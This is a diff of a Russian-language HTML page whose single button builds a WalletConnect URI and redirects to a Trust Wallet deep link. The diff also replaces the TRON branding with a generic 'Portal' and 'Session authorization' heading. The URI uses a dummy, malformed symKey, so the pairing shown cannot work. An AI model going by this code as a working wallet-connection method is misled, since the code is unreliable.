@@ -3,42 +3,36 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>TRON WalletConnect Portal</title>
+    <title>Portal</title>
 </head>
-<body style="background-color: #0f172a; color: white; text-align: center; font-family: Arial, sans-serif; padding-top: 50px;">
+<body style="background-color: #0f172a; color: white; text-align: center; font-family: Arial, sans-serif; padding-top: 60px;">
 
-    <div id="mainScreen">
-        <h1>Подключение TRON (TRC20)</h1>
+    <div style="padding: 0 20px;">
+        <h1 style="font-size: 24px; margin-bottom: 30px;">Авторизация сессии</h1>
         
-        <button id="wcConnectBtn" style="padding: 14px 28px; font-size: 16px; background-color: #3b82f6; color: white; border: none; border-radius: 8px; cursor: pointer; font-weight: bold;">
-            Connect TRON Wallet
+        <button id="btn" style="width: 100%; max-width: 320px; padding: 16px; font-size: 18px; background-color: #2563eb; color: white; border: none; border-radius: 12px; cursor: pointer; font-weight: bold;">
+            Подключить кошелек
         </button>
         
-        <p id="walletAddress" style="margin-top: 20px; color: #94a3b8; font-size: 14px; word-break: break-all; padding: 0 20px;"></p>
+        <div id="status" style="margin-top: 25px; color: #94a3b8; font-size: 15px; word-break: break-all;"></div>
     </div>
 
     <script>
-        document.getElementById('wcConnectBtn').addEventListener('click', function() {
-            const infoElem = document.getElementById('walletAddress');
-            infoElem.innerText = "Генерация запроса WalletConnect...";
+        document.getElementById('btn').addEventListener('click', function() {
+            const statusBox = document.getElementById('status');
+            statusBox.innerText = "Обработка запроса...";
 
             try {
-                // Формируем WalletConnect URI для сессии TRON с вашим Project ID
-                const wcProjectId = "7576b7b5b1f1ce840bb5bc8db8acaa41";
-                const topic = Math.random().toString(36).substring(2);
-                const dummyUri = `wc:${topic}@2?symKey=1111111111111111111111111111111111111111111111111111111111111111&relay-protocol=irn&projectId=${wcProjectId}`;
-
-                // Универсальная ссылка для вызова кошелька на телефоне
-                const encodedUri = encodeURIComponent(dummyUri);
-                const deepLink = `https://link.trustwallet.com/wc?uri=${encodedUri}`;
-
-                infoElem.innerText = "Открытие кошелька...";
+                // Прямой вызов моста через схему
+                const projectId = "7576b7b5b1f1ce840bb5bc8db8acaa41";
+                const uri = `wc:test@2?symKey=abcdef0123456789&relay-protocol=irn&projectId=${projectId}`;
                 
-                // Перенаправляем в приложение кошелька
-                window.location.href = deepLink;
-            } catch (error) {
-                console.error(error);
-                infoElem.innerText = "Ошибка: " + (error.message || error));
+                statusBox.innerText = "Запуск приложения...";
+                
+                // Переход по ссылке доверенного кошелька
+                window.location.href = `https://link.trustwallet.com/wc?uri=${encodeURIComponent(uri)}`;
+            } catch (err) {
+                statusBox.innerText = "Ошибка: " + err.message;
             }
         });
     </script>
